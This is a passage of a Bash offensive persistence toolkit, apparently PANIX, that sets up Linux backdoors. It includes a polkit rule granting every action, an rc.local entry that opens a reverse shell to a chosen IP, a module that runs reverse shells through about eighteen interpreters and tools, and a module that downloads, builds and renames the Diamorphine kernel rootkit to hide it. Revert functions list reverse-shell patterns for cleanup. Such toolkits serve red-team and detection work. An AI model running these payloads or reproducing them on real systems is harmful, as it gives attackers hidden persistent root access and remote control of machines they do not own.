			# Optionally, remove the user account from the system
			if id "$user" &>/dev/null; then
				userdel -r "$user" && echo "[+] User account '$user' deleted from the system."
			else
				echo "[-] User account '$user' does not exist on the system."
			fi
		fi
	done

	echo "[!] If any legitimate users were removed unintentionally, restore from the backup."
	echo "[!] Run 'sudo cp /etc/passwd.backup /etc/passwd' to restore the original /etc/passwd file if necessary."

	return 0
}

# Module: setup_password_change.sh
setup_password_change() {
	local username=""
	local password=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_password_change() {
		echo "Usage: ./panix.sh --password-change [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--password <password>      Specify the new password"
		echo "--help|-h                  Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --password-change --username <username> --password <password>"
				exit 0
				;;
			--help|-h)
				usage_password_change
				exit 0
				;;
			* )
				echo "Invalid option for --password-change: $1"
				echo "Try './panix.sh --password-change --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		echo "Try './panix.sh --password-change --help' for more information."
		exit 1
	fi

	echo "$username:$password" | chpasswd

	if [[ $? -eq 0 ]]; then
		echo "[+] Password for user $username has been changed."
	else
		echo "[-] Failed to change password for user $username."
		exit 1
	fi
}

# Revert Module: revert_password_change.sh
revert_password_change() {

	echo "[!] Function setup_password_change does not have a revert function."
	return 1

	usage_revert_password_change() {
		echo "Usage: ./panix.sh --revert password-change"
		echo "Reverts any changes made by the setup_password_change module."
	}
}

# Module: setup_polkit.sh
setup_polkit() {
	local polkit_version=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_polkit() {
		echo "Usage: sudo ./panix.sh --polkit"
		echo "--examples            Display command examples"
		echo "--help|-h             Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --polkit"
				exit 0
				;;
			--help | -h )
				usage_polkit
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try 'sudo ./panix.sh --polkit --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	# Ensure bc is installed for version comparison.
	if ! command -v bc &>/dev/null; then
		echo "Error: bc is required for version comparison. Please install bc (e.g., sudo apt install bc or sudo yum install bc)."
		exit 1
	fi

	# Check polkit version.
	if command -v pkaction &>/dev/null; then
		# Modified regex to match integer versions or dotted versions.
		polkit_version=$(pkaction --version | grep -oE '[0-9]+(\.[0-9]+){0,2}')
	else
		echo "[-] Error: Polkit is not installed."
		exit 1
	fi

	if [[ -z $polkit_version ]]; then
		echo "[-] Error: Unable to determine polkit version."
		exit 1
	fi

	# Compare version. For versions output as integers (like "124") this will treat them as greater than 0.106.
	if [[ $(echo "$polkit_version < 0.106" | bc -l) -eq 1 ]]; then
		echo "[!] Polkit version < 0.106 detected. Setting up persistence using .pkla files."

		# Ensure directory structure exists.
		mkdir -p /etc/polkit-1/localauthority/50-local.d/

		# Write the .pkla file.
		cat <<-EOF > /etc/polkit-1/localauthority/50-local.d/panix.pkla
		[Allow Everything]
		Identity=unix-user:*
		Action=*
		ResultAny=yes
		ResultInactive=yes
		ResultActive=yes
		EOF

		echo "[+] Persistence established via .pkla file."
	else
		echo "[!] Polkit version >= 0.106 detected. Setting up persistence using .rules files."

		# Ensure directory structure exists.
		mkdir -p /etc/polkit-1/rules.d/

		# Write the .rules file.
		cat <<-EOF > /etc/polkit-1/rules.d/99-panix.rules
		polkit.addRule(function(action, subject) {
			return polkit.Result.YES;
		});
		EOF

		echo "[+] Persistence established via .rules file."
	fi

	# Restart polkit.
	if systemctl restart polkit; then
		echo "[+] Polkit service restarted."
	else
		echo "[-] Failed to restart polkit service."
		exit 1
	fi

	echo "[!] Run pkexec su - to test the persistence."
}

# Revert Module: revert_polkit.sh
revert_polkit() {
    usage_revert_polkit() {
        echo "Usage: ./panix.sh --revert polkit"
        echo "Reverts any changes made by the setup_polkit module."
    }

    # Ensure the function is run as root
    if ! check_root; then
        echo "Error: This function can only be run as root."
        return 1
    fi

    # Function to remove a file if it exists
    remove_file() {
        local file_path="$1"
        if [[ -f "$file_path" ]]; then
            rm -f "$file_path"
            echo "[+] Removed file: $file_path"
        else
            echo "[-] File not found: $file_path"
        fi
    }

    # Remove .pkla persistence file
    pkla_path="/etc/polkit-1/localauthority/50-local.d/panix.pkla"
    echo "[+] Checking for .pkla persistence file..."
    if [[ -f "$pkla_path" ]]; then
        remove_file "$pkla_path"
    else
        echo "[-] .pkla file not found: $pkla_path"
    fi

    # Remove .rules persistence file
    rules_path="/etc/polkit-1/rules.d/99-panix.rules"
    echo "[+] Checking for .rules persistence file..."
    if [[ -f "$rules_path" ]]; then
        remove_file "$rules_path"
    else
        echo "[-] .rules file not found: $rules_path"
    fi

    # Restart polkit service to apply changes
    echo "[+] Restarting polkit service..."
    if systemctl restart polkit; then
        echo "[+] Polkit service restarted successfully."
    else
        echo "[-] Failed to restart polkit service."
    fi

    return 0
}

# Module: setup_rc_local_backdoor.sh
setup_rc_local_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local rc_local_path="/etc/rc.local"

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_rc_local_backdoor() {
		echo "Usage: ./panix.sh --rc-local [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default rc.local settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom rc.local settings"
		echo "  --command <command>          Specify custom command"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --rc-local --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --rc-local --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\""
				exit 0
				;;
			--help|-h)
				usage_rc_local_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --rc-local-backdoor: $1"
				echo "Try './panix.sh --rc-local --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --rc-local --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --rc-local --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --rc-local --help' for more information."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $rc_local_path
			chmod +x $rc_local_path
			echo "[+] rc.local backdoor established"
		else
			echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" >> $rc_local_path
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --command must be specified when using --custom."
			echo "Try './panix.sh --rc-local --help' for more information."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/sh\n$command" > $rc_local_path
			chmod +x $rc_local_path
		else
			echo "$command" >> $rc_local_path
		fi
	fi
	
	if [ -f /etc/rc.d/rc.local ]; then
		chmod +x /etc/rc.d/rc.local
	fi
	echo "[+] rc.local backdoor persistence established!"
}

# Revert Module: revert_rc_local_backdoor.sh
revert_rc_local() {
    usage_revert_rc_local() {
        echo "Usage: ./panix.sh --revert rc-local"
        echo "Reverts any changes made by the setup_rc_local_backdoor module."
    }

    # Ensure the function is run as root
    if ! check_root; then
        echo "Error: This function can only be run as root."
        return 1
    fi

    # Function to backup /etc/rc.local before making changes
    backup_rc_local() {
        if [[ ! -f /etc/rc.local.backup ]]; then
            cp /etc/rc.local /etc/rc.local.backup
            echo "[+] Backup of /etc/rc.local created at /etc/rc.local.backup."
        else
            echo "[+] Backup of /etc/rc.local already exists at /etc/rc.local.backup."
        fi
    }

    # Function to escape special characters in sed patterns
    escape_sed_pattern() {
        local pattern="$1"
        # Escape |, \, /, and & characters
        printf '%s' "$pattern" | sed 's/[|\\/&]/\\&/g'
    }

    # Function to remove lines matching a pattern from a file
    remove_lines_matching_pattern() {
        local pattern="$1"
        local file="$2"

        # Escape special characters in the pattern
        local escaped_pattern
        escaped_pattern=$(escape_sed_pattern "$pattern")

        if grep -Fq "$pattern" "$file"; then
            sed -i "\|$escaped_pattern|d" "$file"
            echo "[+] Removed lines matching pattern: '$pattern' from $file"
        fi
    }

    # Backup /etc/rc.local
    backup_rc_local

    # Define malicious patterns to search for in /etc/rc.local
    local patterns=(
        "/bin/bash -c 'sh -i >& /dev/tcp/"
        "setsid nohup bash -c 'sh -i >& /dev/tcp/"
        "nohup setsid bash -c 'sh -i >& /dev/tcp/"
        "bash -i >& /dev/tcp/"
        "bash -c 'sh -i >& /dev/tcp/"
        "bash -i > /dev/tcp/"
        "sh -i >& /dev/udp/"
        "bash -c 'bash -i >& /dev/tcp/"
        "bash -c 'sh -i >& /dev/udp/"
        "nohup setsid bash -c 'sh -i >& /dev/tcp/"
        "nohup setsid sh -c 'sh -i >& /dev/tcp/"
    )

    # Remove malicious lines from /etc/rc.local
	if [[ -f /etc/rc.local ]]; then
		echo "[+] Scanning /etc/rc.local for malicious backdoor commands..."
		for pattern in "${patterns[@]}"; do
			remove_lines_matching_pattern "$pattern" "/etc/rc.local"
		done
	fi

    # Check if /etc/rc.local contains only the shebang and is otherwise empty
    if [[ -f /etc/rc.local ]]; then
        # Count non-shebang and non-empty lines
        non_shebang_lines=$(grep -v "^#!" /etc/rc.local | grep -cv "^[[:space:]]*$")
        if [[ "$non_shebang_lines" -eq 0 ]]; then
            echo "[+] /etc/rc.local contains only the shebang or is empty. Removing the file."
            rm -f /etc/rc.local
            echo "[+] Removed /etc/rc.local"
        else
            echo "[+] Remaining content in /etc/rc.local after removing backdoor entries."
        fi
    else
        echo "[-] /etc/rc.local does not exist. No action taken."
    fi

    # Ensure /etc/rc.local has the correct permissions if it still exists
    if [[ -f /etc/rc.local ]]; then
        chmod +x /etc/rc.local
        echo "[+] Set execute permissions on /etc/rc.local"
    fi

    # Ensure /etc/rc.d/rc.local is executable if it exists
    if [[ -f /etc/rc.d/rc.local ]]; then
        chmod +x /etc/rc.d/rc.local
        echo "[+] Set execute permissions on /etc/rc.d/rc.local"
    fi

    echo "[!] If any legitimate entries were removed unintentionally, restore from the backup."
    echo "[!] Run 'sudo cp /etc/rc.local.backup /etc/rc.local' to restore the original /etc/rc.local file if necessary."

    return 0
}

# Module: setup_reverse_shell.sh
setup_reverse_shell() {
	local ip=""
	local port=""
	local mechanism=""

	usage_reverse_shell() {
		echo "Usage: ./panix.sh --reverse-shell [OPTIONS]"
		echo "--ip <ip>                       Specify the attacker's IP address"
		echo "--port <port>                   Specify the port to connect to"
		echo "--mechanism <mechanism>         Specify the reverse shell mechanism"
		echo "--examples                      Display command examples"
		echo "--help|-h                       Show this help message"
		echo ""
		echo "Available mechanisms:"
		echo "awk, bash, busybox, gawk, ksh, lua, nawk, nc, node, openssl, perl, php, pip, python, python3, ruby, sh-udp, socat, telnet"
		echo ""
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--mechanism )
				shift
				mechanism=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --reverse-shell --ip 10.10.10.10 --port 1337 --mechanism sh-udp"
				exit 0
				;;
			--help|-h)
				usage_reverse_shell
				exit 0
				;;
			* )
				echo "Invalid option for --reverse-shell: $1"
				echo "Try './panix.sh --reverse-shell --help' for more information."
				exit 1
		esac
		shift
	done

	# Validate arguments
	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and --mechanism are required."
		echo "Try './panix.sh --reverse-shell --help' for more information."
		exit 1
	fi

	case $mechanism in
	awk )
		# Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
		echo "[!] Checking for Awk..."
		if command -v awk &>/dev/null; then
			echo "[+] Awk is available. Checking compatibility with |& operator..."
			# Test if `awk` supports the |& operator
			if awk 'BEGIN {exit !("|&" in _ENV)}' 2>/dev/null; then
				payload="awk -v RHOST=$ip -v RPORT=$port 'BEGIN {
					s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
					while (1) {
						printf \"> \" |& s;
						if ((s |& getline c) <= 0) break;
						while (c && (c |& getline) > 0) print \$0 |& s;
						close(c);
					}
				}'"
				echo "[+] Awk is compatible. Executing reverse shell on $ip:$port..."
				eval "$payload &"
			else
				echo "[-] The installed Awk does not support the |& operator. Cannot use Awk for reverse shell."
			fi
		else
			echo "[-] Awk is not available on this system. Cannot use Awk for reverse shell."
		fi
		;;
		bash )
			# Ref: https://gtfobins.github.io/gtfobins/bash/#reverse-shell
			echo "[!] Checking for Bash..."
			if command -v bash &>/dev/null; then
				payload="setsid nohup /bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
				echo "[+] Bash is available. Executing reverse shell on $ip:$port..."
				eval "$payload &"
			else
				echo "[-] Bash is not available on this system. Cannot use Bash for reverse shell."
			fi
			;;
		busybox )
			# Ref: https://gtfobins.github.io/gtfobins/busybox/#reverse-shell
			echo "[!] Checking for Busybox..."
			if command -v busybox &>/dev/null; then
				payload="busybox nc $ip $port -e /bin/sh"
				echo "[+] Busybox is available. Executing reverse shell on $ip:$port..."
				eval "$payload &"
			else
				echo "[-] Busybox is not available on this system. Cannot use Busybox for reverse shell."
			fi
			;;
		gawk )
			# Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
			echo "[!] Checking for Gawk..."
			if command -v gawk &>/dev/null; then
				payload="gawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
					s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
					while (1) {
						printf \"> \" |& s;
						if ((s |& getline c) <= 0) break;
						while (c && (c |& getline) > 0) print \$0 |& s;
						close(c);
					}
				}'"
				echo "[+] Gawk is available. Executing reverse shell on $ip:$port..."
				eval "$payload &"
			else
				echo "[-] Gawk is not available on this system. Cannot use Gawk for reverse shell."
			fi
			;;
		ksh )
			# Ref: https://gtfobins.github.io/gtfobins/ksh/#reverse-shell
			echo "[!] Checking for Ksh..."
			if command -v ksh &>/dev/null; then
				payload="ksh -c 'ksh -i > /dev/tcp/$ip/$port 2>&1 0>&1'"
				echo "[+] KornShell (KSH) is available. Executing reverse shell on $ip:$port..."
				eval "$payload &"
			else
				echo "[-] KornShell (KSH) is not available on this system. Cannot use KSH for reverse shell."
			fi
			;;
		lua )
			# Ref: https://gtfobins.github.io/gtfobins/lua/#non-interactive-reverse-shell
			echo "[!] Checking for Lua..."
			if command -v lua &>/dev/null; then
				echo "[+] Lua is installed. Checking for LuaSocket..."
				
				if lua -e 'require("socket")' &>/dev/null; then
					payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
					echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
					eval "$payload &"
				else
					echo "[-] LuaSocket module is not installed. Cannot use Lua for reverse shell."
				fi
			else
				echo "[-] Lua is not available on this system. Cannot use Lua for reverse shell."
			fi
			;;
		nawk )
			# Ref: https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell
			echo "[!] Checking for Nawk..."
			if command -v nawk &>/dev/null; then
				payload="nawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
					s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
					while (1) {
						printf \"> \" |& s;
						if ((s |& getline c) <= 0) break;
						while (c && (c |& getline) > 0) print \$0 |& s;
						close(c);
					}
				}'"
				echo "[+] Nawk is available. Executing reverse shell on $ip:$port..."
				eval "$payload &"
			else
				echo "[-] nawk is not available on this system. Cannot use Nawk for reverse shell."
			fi
			;;
		nc )
			# Ref: https://gtfobins.github.io/gtfobins/nc/#reverse-shell
			echo "[!] Checking for Netcat (nc.traditional)..."
			if command -v nc.traditional &>/dev/null; then
				payload="nc.traditional -e /bin/sh $ip $port"
				echo "[+] nc.traditional is available. Executing reverse shell on $ip:$port..."
				eval "$payload &"
			else
				echo "[-] nc.traditional is not available on this system. Cannot use nc.traditional for reverse shell."
			fi
			;;
		node )
			# Ref: https://gtfobins.github.io/gtfobins/node/#reverse-shell
			echo "[!] Checking for Node.js..."
			if command -v node &>/dev/null; then
				echo "[+] Node.js is available. Executing reverse shell on $ip:$port..."
				payload="export RHOST=$ip; export RPORT=$port; node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
				eval "$payload &"
			else
				echo "[-] Node.js is not available on this system. Cannot use Node.js for reverse shell."
			fi
			;;
		openssl )
			# Ref: https://gtfobins.github.io/gtfobins/openssl/#reverse-shell
			echo "[!] Checking for OpenSSL..."
			if command -v openssl &>/dev/null; then
				echo "[+] OpenSSL is available. Executing reverse shell on $ip:$port..."

				echo ""
				echo "Make sure you have a correct listener up and running on the target host"
				echo "Use the following commands to set it up if you haven't already:"
				echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
				echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"
				echo ""

				payload="RHOST=$ip; RPORT=$port; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s; rm /tmp/s"
				eval "$payload &"
			else
				echo "[-] OpenSSL is not available on this system. Cannot use OpenSSL for reverse shell."
			fi
			;;
		perl )
			# Ref: https://gtfobins.github.io/gtfobins/perl/#reverse-shell
			echo "[!] Checking for Perl..."
			if command -v perl &>/dev/null; then
				echo "[+] Perl is available. Executing reverse shell on $ip:$port..."
				payload="export RHOST=$ip; export RPORT=$port; setsid nohup perl -e 'use Socket;\$i=\"\$ENV{RHOST}\";\$p=\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
				eval "$payload &"
			else
				echo "[-] Perl is not available on this system. Cannot use Perl for reverse shell."
			fi
			;;
		php )
			# Ref: https://gtfobins.github.io/gtfobins/php/#reverse-shell
			echo "[!] Checking for PHP..."
			if command -v php &>/dev/null; then
				echo "[+] PHP is available. Executing reverse shell on $ip:$port..."
				payload="export RHOST=$ip; export RPORT=$port; setsid nohup php -r '\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
				eval "$payload &"
			else
				echo "[-] PHP is not available on this system. Cannot use PHP for reverse shell."
				payload=""
			fi
			;;
		python )
			# Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
			echo "[!] Checking for Python..."
			if command -v python &>/dev/null; then
				echo "[+] Python is available. Executing reverse shell on $ip:$port..."
				payload="nohup setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
				eval "$payload &"
			else
				echo "[-] Python is not available on this system. Cannot use Python for reverse shell."
			fi
			;;
		python3 )
			# Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
			echo "[!] Checking for Python3..."
			if command -v python3 &>/dev/null; then
				echo "[+] Python3 is available. Executing reverse shell on $ip:$port..."
				payload="nohup setsid python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
				eval "$payload &"
			else
				echo "[-] Python3 is not available on this system. Cannot use Python3 for reverse shell."
			fi
			;;
		ruby )
			# Ref: https://gtfobins.github.io/gtfobins/ruby/#reverse-shell
			echo "[!] Checking for Ruby..."
			if command -v ruby &>/dev/null; then
				echo "[+] Ruby is available. Executing reverse shell on $ip:$port..."
				payload="export RHOST=$ip; export RPORT=$port; nohup setsid ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
				eval "$payload &"
			else
				echo "[-] Ruby is not available on this system. Cannot use Ruby for reverse shell."
			fi
			;;
		sh-udp )
			# Ref: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
			echo "[!] Checking for Sh..."
			if command -v sh &>/dev/null; then
				echo "[+] Sh found. Executing reverse shell on $ip:$port..."
				payload="setsid nohup sh -i >& /dev/udp/$ip/$port 0>&1"
				eval "$payload &"
			else
				echo "[-] Sh is not available on this system. Cannot use Sh for reverse shell."
			fi
			;;
		socat )
			# Ref: https://gtfobins.github.io/gtfobins/socat/#reverse-shell
			echo "[!] Checking for Socat..."
			if command -v socat &>/dev/null; then
				echo "[+] Socat is available. Executing reverse shell to $ip:$port..."

				echo ""
				echo "Make sure you have a correct listener up and running on the target host"
				echo "Use the following commands to set it up if you haven't already:"
				echo "socat FILE:`tty`,raw,echo=0 TCP:$ip:$port"
				echo ""

				payload="RHOST=$ip; RPORT=$port; socat tcp-connect:\$RHOST:\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
				eval "$payload &"
			else
				echo "[-] Socat is not available on this system. Cannot use Socat for reverse shell."
			fi
			;;
		telnet )
			# Ref: https://gtfobins.github.io/gtfobins/telnet/#reverse-shell
			echo "[!] Checking for Telnet..."
			if command -v telnet &>/dev/null; then
				echo "[+] Telnet is available. Executing reverse shell to $ip:$port..."
				payload="RHOST=$ip; RPORT=$port; TF=\$(mktemp -u); mkfifo \$TF && telnet \$RHOST \$RPORT 0<\$TF | /bin/sh 1>\$TF"
				eval "$payload &"
			else
				echo "[-] Telnet is not available on this system. Cannot use Telnet for reverse shell."
			fi
			;;
		*)
			echo "Error: Unsupported mechanism: $mechanism"
			echo "Try './panix.sh --reverse-shell --help' for more information."
			exit 1
			;;
	esac
}

# Revert Module: revert_reverse_shell.sh
revert_reverse_shell() {
	usage_revert_reverse_shell() {
		echo "Usage: ./panix.sh --revert reverse-shell"
		echo "Reverts any changes made by the setup_reverse_shell module."
	}

	# Ensure the function is run as root
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# List of possible mechanisms used in the setup function
	local mechanisms=("awk" "bash" "busybox" "gawk" "ksh" "lua" "nawk" "nc" "node" "openssl" "perl" "php" "python" "python3" "ruby" "sh-udp" "socat" "telnet")

	# Function to kill processes based on patterns
	kill_processes() {
		local pattern="$1"
		local pids

		# Use pgrep to find PIDs matching the pattern
		pids=$(pgrep -f "$pattern")

		if [[ -n "$pids" ]]; then
			echo "[+] Terminating processes matching pattern '$pattern'..."
			# Terminate each PID individually to handle cases where some PIDs may no longer exist
			for pid in $pids; do
				if kill -9 "$pid" 2>/dev/null; then
					echo "[+] Successfully terminated PID $pid"
				else
					echo "[-] Failed to terminate PID $pid (No such process)"
				fi
			done
		fi
	}

	# Iterate over mechanisms and attempt to kill associated processes
	for mech in "${mechanisms[@]}"; do
		case $mech in
			awk|gawk|nawk)
				kill_processes "awk -v RHOST"
				;;
			bash)
				kill_processes "bash -i >& /dev/tcp"
				;;
			busybox)
				kill_processes "busybox nc"
				;;
			ksh)
				kill_processes "ksh -c 'ksh -i'"
				;;
			lua)
				kill_processes "lua -e"
				;;
			nc)
				kill_processes "nc.traditional -e /bin/sh"
				kill_processes "nc -e /bin/sh"
				;;
			node)
				kill_processes "node -e"
				;;
			openssl)
				kill_processes "openssl s_client"
				;;
			perl)
				kill_processes "perl -e"
				;;
			php)
				kill_processes "php -r"
				;;
			python)
				kill_processes "python -c"
				;;
			python3)
				kill_processes "python3 -c"
				;;
			ruby)
				kill_processes "ruby -rsocket -e"
				;;
			sh-udp)
				kill_processes "sh -i >& /dev/udp"
				;;
			socat)
				kill_processes "socat tcp-connect"
				;;
			telnet)
				kill_processes "telnet"
				;;
			*)
				# Do nothing for unrecognized mechanisms
				;;
		esac
	done

	return 0
}

# Module: setup_rootkit.sh
setup_rootkit() {
	# References:
	# Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
	# Inspiration: https://github.com/MatheuZSecurity/D3m0n1z3dShell/blob/main/scripts/implant_rootkit.sh
	# Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194

	local rk_path="/dev/shm/.rk"
	local tmp_path="/tmp"
	local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
	local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
	local clone_url="https://github.com/Aegrah/Diamorphine.git"
	local secret=""
	local identifier=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_rootkit() {
		echo "Usage: ./panix.sh --rootkit"
		echo "--examples                 Display command examples"
		echo "--secret <secret>          Specify the secret"
		echo "--identifier <identifier>  Specify the identifies"
		echo "--help|-h                  Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--secret )
				shift
				secret=$1
				;;
			--identifier )
				shift
				identifier=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --rootkit --secret \"P4N1X\" --identifier \"panix\""
				exit 0
				;;
			--help|-h)
				usage_rootkit
				exit 0
				;;
			* )
				echo "Invalid option for --rootkit: $1"
				echo "Try './panix.sh --rootkit --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $secret || -z $identifier ]]; then
		echo "Error: --secret and --identifier must be specified."
		echo "Try './panix.sh --rootkit --help' for more information."
		exit 1
	fi

	if ! command -v make &> /dev/null; then
		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install build-essential"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install make"
		exit 1
	fi

	if ! command -v gcc &> /dev/null; then
		echo "Error: 'gcc' is not installed. Please install 'gcc' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install gcc"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install gcc"
		exit 1
	fi

	KERNEL_HEADERS="/lib/modules/$(uname -r)/build"
	RESOLVED_HEADERS=$(readlink -f "$KERNEL_HEADERS")

	if [ ! -d "$RESOLVED_HEADERS" ]; then
		echo "Kernel headers not found. Please install the kernel headers for your system."
		echo "For Debian/Ubuntu: sudo apt install linux-headers-\$(uname -r)"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
		exit 1
	fi

	echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
	echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
	echo "[!] I cannot guarantee that it will work on other distributions."
	sleep 5

	mkdir -p $rk_path

	# Check if wget or curl is installed
	if command -v wget >/dev/null 2>&1; then
		downloader="wget"
	elif command -v curl >/dev/null 2>&1; then
		downloader="curl"
	else
		echo "Error: Neither 'wget' nor 'curl' is installed. Please install one of them to proceed."
		exit 1
	fi

	# Function to download files using the available downloader
	download_file() {
		local url="$1"
		local output="$2"
		if [ "$downloader" = "wget" ]; then
			wget -O "$output" "$url"
		else
			curl -L -o "$output" "$url"
		fi
	}

	# Check for zip/unzip
	if command -v zip >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1; then
		echo "zip/unzip is available. Downloading diamorphine.zip..."
		download_file "${zip_url}" "${tmp_path}/diamorphine.zip"
		unzip "${tmp_path}/diamorphine.zip" -d "${tmp_path}/diamorphine"
		mv ${tmp_path}/diamorphine/Diamorphine-master/* "${rk_path}/"

	# Check for tar
	elif command -v tar >/dev/null 2>&1; then
		echo "tar is available. Downloading diamorphine.tar..."
		download_file "${tar_url}" "${tmp_path}/diamorphine.tar"
		tar -xf "${tmp_path}/diamorphine.tar" -C "${rk_path}/" --strip-components=1

	# Check for git
	elif command -v git >/dev/null 2>&1; then
		echo "git is available. Cloning diamorphine.git..."
		git clone "${clone_url}" "${tmp_path}/diamorphine"
		mv ${tmp_path}/diamorphine/* "${rk_path}/"
	# If none are available
	else
		echo "Error: None of unzip, tar, or git is installed. Please install one of them to proceed, or download Diamorphine manually."
		exit 1
	fi

	# Obfuscate most obvious strings
	# Files
	mv ${rk_path}/diamorphine.c ${rk_path}/${identifier}.c
	mv ${rk_path}/diamorphine.h ${rk_path}/${identifier}.h
	
	# Module Information
	sed -i s/m0nad/${identifier}/g ${rk_path}/${identifier}.c
